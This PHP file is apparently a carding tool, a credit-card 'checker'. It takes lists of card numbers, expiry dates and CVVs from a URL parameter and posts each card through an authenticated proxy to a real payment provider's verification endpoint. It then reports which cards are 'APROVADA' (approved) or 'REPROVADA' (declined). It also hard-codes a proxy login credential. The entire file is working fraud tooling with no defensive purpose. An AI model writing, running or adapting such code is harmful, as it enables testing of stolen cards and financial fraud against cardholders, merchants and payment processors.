<?php

/************************************************************************

                                          Powered by VICTOR>FOXSSH                                           Created by @FOXSSH

************************************************************************/

error_reporting(0);


$proxy = "proxy.apify.com:8000";
$auth = "auto:ru8rFaFBgBohht57Q77GQoS42";


function multiseparador($delimiters,$string) { 
$ready = str_replace($delimiters, $delimiters[0], $string); 
$launch = explode($delimiters[0], $ready); 
return  $launch; 
} 

$lista = $_GET['lista'];
$cc = multiseparador(array(":", "|", ""), $lista)[0];
$mes = multiseparador(array(":", "|", ""), $lista)[1];
$ano = multiseparador(array(":", "|", ""), $lista)[2];
$cvv = multiseparador(array(":", "|", ""), $lista)[3];

include("consultabin.php");

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://psp.payletter.com/Smart/Payment/PLCard/CreditCardMpi/veri_host.aspx');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);  
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $auth);
        curl_setopt($ch, CURLOPT_TIMEOUT, 800);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'returnUrl=.%2FReturn.aspx&pan='.$cc.'&expiry=22'.$mes.'&purchase_amount=9.99');
        $checker = curl_exec($ch);
        
        
if(strpos($checker, "auth.bb") !== false){
         echo "<font color='lime' style='font-size: 15px'> APROVADA ➜ $cc|$mes|$ano|$cvv|$bin [ TRANSAÇÃO APROVADA! ] @alex";
       } 
       else {
         echo "<font color='red' style='font-size: 15px'> REPROVADA ➜ $cc|$mes|$ano|$cvv [ TRANSAÇÃO REPROVADA! ] @alex\n";
       }

?>